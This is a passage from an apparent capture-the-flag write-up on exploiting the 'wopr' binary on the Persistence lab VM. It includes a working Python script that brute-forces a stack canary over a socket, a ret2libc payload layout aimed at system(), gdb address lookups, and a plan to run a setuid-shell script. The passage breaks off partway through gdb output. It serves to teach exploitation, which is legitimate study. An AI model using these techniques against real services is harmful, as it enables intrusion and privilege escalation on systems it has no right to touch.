<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
</span><span class='line'><span class="o">[</span>0x41414141<span class="o">]</span>        <span class="c">#&lt;-- EIP?</span>
</span></code></pre></td></tr></table></div></figure>


<p>Was this where EIP was?</p>

<p>With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
</span><span class='line'>
</span><span class='line'>[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]
</span><span class='line'>
</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
</span></code></pre></td></tr></table></div></figure>


<h2>wopr &ndash; stack canary bruteforce</h2>

<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>

<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>

<ul>
<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
</ul>


<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>

<p>From <code>man 2 fork</code>&rsquo;s description:</p>

<figure class='code'><figcaption><span>fork man</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DESCRIPTION
</span><span class='line'>     Fork<span class="o">()</span> causes creation of a new process.  The new process <span class="o">(</span>child process<span class="o">)</span>
</span><span class='line'>     is an exact copy of the calling process <span class="o">(</span>parent process<span class="o">)</span> except <span class="k">for </span>the
</span><span class='line'>     following:
</span><span class='line'>
</span><span class='line'> <span class="o">[</span>.. snip ..<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>

<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>

<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) &ndash;> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>

<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>

<figure class='code'><figcaption><span>Canary Brute Success Condition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# telnet 127.0.0.1 3333
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'>&gt; A
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="s1">&#39;t think so</span>
</span><span class='line'><span class="s1">[+] bye!                           # &lt;-- We have a bye!</span>
</span><span class='line'><span class="s1">Connection closed by foreign host.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">root@kali:~# telnet 127.0.0.1 3333</span>
</span><span class='line'><span class="s1">Trying 127.0.0.1...</span>
</span><span class='line'><span class="s1">Connected to 127.0.0.1.</span>
</span><span class='line'><span class="s1">Escape character is &#39;</span>^<span class="o">]</span><span class="s1">&#39;.</span>
</span><span class='line'><span class="s1">[+] hello, my name is sploitable</span>
</span><span class='line'><span class="s1">[+] would you like to play a game?</span>
</span><span class='line'><span class="s1">&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
</span><span class='line'><span class="s1">[+] yeah, I don&#39;</span>t think so
</span><span class='line'>Connection closed by foreign host. <span class="c"># &lt;-- No bye!</span>
</span></code></pre></td></tr></table></div></figure>


<p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>

<figure class='code'><figcaption><span>canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes before the first canary bit is hit</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>         <span class="c"># the canary</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the byte</span>
</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the payload</span>
</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Trying: &#39;</span><span class="se">\\</span><span class="s">x{0}&#39; in payload &#39;</span><span class="si">%s</span><span class="s">&#39; (</span><span class="si">%d</span><span class="s">:</span><span class="si">%d</span><span class="s">/255)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="n">send</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># get the inital banners</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt;</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># send the payload  </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[!!] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit. No luck&quot;</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary seems to be {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[-] Unable to brute canary&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>An example run of this would end as follows:</p>

<figure class='code'><figcaption><span>Running canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8d&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:141/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8e&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:142/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8f&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:143/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x90&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:144/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>!!<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;90&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary seems to be 00ef8d90
</span></code></pre></td></tr></table></div></figure>


<p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>

<h2>wopr &ndash; NX and EIP</h2>

<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>

<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>

<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>

<figure class='code'><figcaption><span>ASLR check</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>

<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>

<figure class='code'><figcaption><span>finding system()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>gdb -q /usr/bin/telnet
</span><span class='line'>Reading symbols from /usr/bin/telnet...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main   <span class="c"># set a breakpoint to stop the flow once we hit the main() func</span>
</span><span class='line'>Breakpoint 1 at 0x7b90
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r         <span class="c"># run the program</span>
</span><span class='line'>Starting program: /usr/bin/telnet
</span><span class='line'>Breakpoint 1, 0x00117b90 in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c"># We hit our breakpoint, lets leak the address for system()</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e56210 &lt;system&gt;
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>

<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>

<figure class='code'><figcaption><span>Stack after memory corruption up to EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
</span><span class='line'>
</span><span class='line'>[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
</span><span class='line'> ^~ Initial BF    ^~ Bruted cookie                    ^~ system()
</span><span class='line'>
</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
</span></code></pre></td></tr></table></div></figure>


<p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>

<h2>wopr &ndash; code exec</h2>

<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>

<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>

<p>I tried to put a command in a env variable and failed.<br/>
I attempted to write a ROP chain and failed.</p>

<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>

<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>

<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>

<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>

<figure class='code'><figcaption><span>wopr strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# strings  wopr
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>_IO_stdin_used
</span><span class='line'>
</span><span class='line'><span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
</span><span class='line'>socket
</span><span class='line'>setsockopt
</span><span class='line'><span class="nb">bind</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
</span><span class='line'>listen
</span><span class='line'>/tmp/log          <span class="c"># &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
</span><span class='line'>TMPLOG
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
</span><span class='line'>accept
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
</span></code></pre></td></tr></table></div></figure>


<p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>

<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>

<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>

<figure class='code'><figcaption><span>finding</span><a href='http://leonjza.github.io/tmp/log'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
</span><span class='line'>Reading symbols from wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *main
</span><span class='line'>Breakpoint 1 at 0x80487de
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0x66a6f92e
</span><span class='line'>EDX: 0x1
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0xbffff478 --&gt; 0x0
</span><span class='line'>ESP: 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>EIP: 0x80487de <span class="o">(</span>&lt;main&gt;: push   ebp<span class="o">)</span>
</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x80487d7 &lt;get_reply+99&gt;:    call   0x804865c &lt;__stack_chk_fail@plt&gt;
</span><span class='line'>   0x80487dc &lt;get_reply+104&gt;:   leave
</span><span class='line'>   0x80487dd &lt;get_reply+105&gt;:   <span class="nv">ret</span>
</span><span class='line'><span class="o">=</span>&gt; 0x80487de &lt;main&gt;:    push   ebp
</span><span class='line'>   0x80487df &lt;main+1&gt;:  mov    ebp,esp
</span><span class='line'>   0x80487e1 &lt;main+3&gt;:  sub    esp,0x258
</span><span class='line'>   0x80487e7 &lt;main+9&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
</span><span class='line'>   0x80487ea &lt;main+12&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0x23c<span class="o">]</span>,eax
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff400 --&gt; 0x1
</span><span class='line'>0008<span class="p">|</span> 0xbffff404 --&gt; 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff408 --&gt; 0xbffff4ac --&gt; 0xbffff629 <span class="o">(</span><span class="s2">&quot;SSH_AGENT_PID=3171&quot;</span><span class="o">)</span>
